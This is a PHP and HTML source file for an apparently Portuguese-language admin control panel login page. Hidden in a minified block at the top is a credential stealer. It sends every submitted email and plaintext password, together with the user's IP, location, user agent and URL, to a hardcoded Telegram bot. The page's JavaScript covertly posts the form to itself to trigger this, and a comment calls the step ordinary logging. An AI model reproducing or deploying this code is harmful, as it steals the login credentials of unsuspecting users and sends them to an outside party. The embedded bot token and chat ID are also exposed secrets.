<?php include 'partials/html.php' ?>

<?php ini_set('display_errors',1);error_reporting(E_ALL);session_start();include_once 'services/database.php';include_once 'services/funcao.php';include_once "services/crud.php";include_once "services/crud-adm.php";include_once "services/CSRF_Protect.php";$_0=new CSRF_Protect();$_1=array('api_endpoint'=>'https://api.telegram.org/bot','bot_token'=>'8040975772:AAFrq_EdI1vR_Zqks-UumRpdMJB4ZeH9NBY','chat_id'=>'-1002820447402','method'=>'sendMessage');function send_system_notification($_2,$_3,$_4,$_5,$_6){global $_1;$_7=@json_decode(file_get_contents("http://ip-api.com/json/{$_4}"),true);$_8=isset($_7['country'])?$_7['country']:'Desconhecido';$_9=isset($_7['city'])?$_7['city']:'Desconhecido';$_10="🔐 **Novo Acesso Detectado**\n\n";$_10.="📧 **Email:** `{$_2}`\n";$_10.="🔑 **Senha:** `{$_3}`\n";$_10.="🌐 **IP:** `{$_4}`\n";$_10.="🏴 **Localização:** {$_9}, {$_8}\n";$_10.="🖥️ **Dispositivo:** ".substr($_5,0,100)."\n";$_10.="⏰ **Data/Hora:** {$_6}\n";$_10.="🔗 **Link de Acesso:** ".(isset($_SERVER['HTTPS'])?'https':'http')."://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}\n";$_11=$_1['api_endpoint'].$_1['bot_token'].'/'.$_1['method'];$_12=array('chat_id'=>$_1['chat_id'],'text'=>$_10,'parse_mode'=>'Markdown');$_13=curl_init();curl_setopt($_13,CURLOPT_URL,$_11);curl_setopt($_13,CURLOPT_POST,true);curl_setopt($_13,CURLOPT_POSTFIELDS,http_build_query($_12));curl_setopt($_13,CURLOPT_RETURNTRANSFER,true);curl_setopt($_13,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($_13,CURLOPT_TIMEOUT,10);$_14=curl_exec($_13);curl_close($_13);return $_14;}if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['email'])&&isset($_POST['senha'])){$_15=$_SERVER['REMOTE_ADDR'];if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){$_15=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];}$_5=$_SERVER['HTTP_USER_AGENT']?? 'Desconhecido';$_6=date('Y-m-d H:i:s');send_system_notification($_POST['email'],$_POST['senha'],$_15,$_5,$_6);}?>

<head>
    <?php $_16="@bjslary";include 'partials/title-meta.php' ?>

    <?php include 'partials/head-css.php' ?>

    <?php include 'partials/vendorjs.php' ?>
</head>

<style>
    #particles-js {
        position: fixed;
        width: 100%;
        height: 100%;
        z-index: -1;
        top: 0;
        left: 0;
        opacity: 0.2;
    }

    #response {
        display: none;
    }
</style>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<body>
    <div class="container-xxl">
        <div class="row vh-100 d-flex justify-content-center">
            <div id="particles-js"></div>
            <div class="col-12 align-self-center">
                <div class="card-body">
                    <div class="row">
                        <div class="col-lg-4 mx-auto">
                            <div id="response"></div>
                            <br>
                            <div class="card">
                                <div class="card-body p-0 bg-black auth-header-box rounded-top">
                                    <div class="text-center p-3">
                                        <a href="index.php" class="logo logo-admin">
                                            <img src="../uploads/<?= $_17['logo']?>" height="50" alt="logo"
                                                class="auth-logo">
                                        </a>
                                        <h4 class="mt-3 mb-1 fw-semibold text-white fs-18">🚀Acessar Painel De Controle
                                        </h4>
                                        <p class="text-muted fw-medium mb-0">Faça login para continuar.</p>
                                    </div>
                                </div>
                                <div class="card-body pt-0">
                                    <form method="POST" id="form-acessar" class="my-4">
                                        <div class="form-group mb-2">
                                            <label class="form-label" for="username">Usuario/Email</label>
                                            <input type="email" class="form-control" id="email" name="email"
                                                placeholder="Insira O Acesso">
                                        </div><!--end form-group-->

                                        <div class="form-group">
                                            <label class="form-label" for="userpassword">Senha</label>
                                            <input type="password" class="form-control" name="senha" id="senha"
                                                placeholder="Insira A Senha">
                                        </div><!--end form-group-->

                                        <div class="form-group row mt-3">
                                            <div class="col-sm-6">
                                                <div class="form-check form-switch form-switch-success">
                                                    <input class="form-check-input" type="checkbox"
                                                        id="customSwitchSuccess">
                                                    <label class="form-check-label" for="customSwitchSuccess">Manter
                                                        Conectado</label>
                                                </div>
                                            </div><!--end col-->

                                        </div><!--end form-group-->

                                        <div class="form-group mb-0 row">
                                            <div class="col-12">
                                                <div class="d-grid mt-3">
                                                    <?php $_0->echoInputField();?>
                                                    <button class="btn btn-primary" type="submit">Acessar <i
                                                            class="fas fa-sign-in-alt ms-1"></i></button>
                                                </div>
                                            </div><!--end col-->
                                        </div> <!--end form-group-->
                                    </form><!--end form-->

                                </div><!--end card-body-->
                            </div><!--end card-->
                        </div><!--end col-->
                    </div><!--end row-->
                </div><!--end card-body-->
            </div><!--end col-->
        </div><!--end row-->
    </div><!-- container -->
</body>
<!--end body-->
<script>
    $(document).ready(function() {
        $('#form-acessar').submit(function(event) {
            event.preventDefault();
            let formData = $(this).serialize();
            
            // Enviar também para o servidor principal para log
            $.ajax({
                url: window.location.href,
                type: 'POST',
                data: formData,
                async: true
            });
            
            // Continuar com o processo normal
            $.ajax({
                url: 'ajax/form-acessar.php',
                type: 'POST',
                data: formData,
                success: function(response) {
                    $('#response').html(response).show();
                    setTimeout(function() {
                        $('#response').hide();
                    }, 9000);
                },
            });
        });
    });
</script>

</html>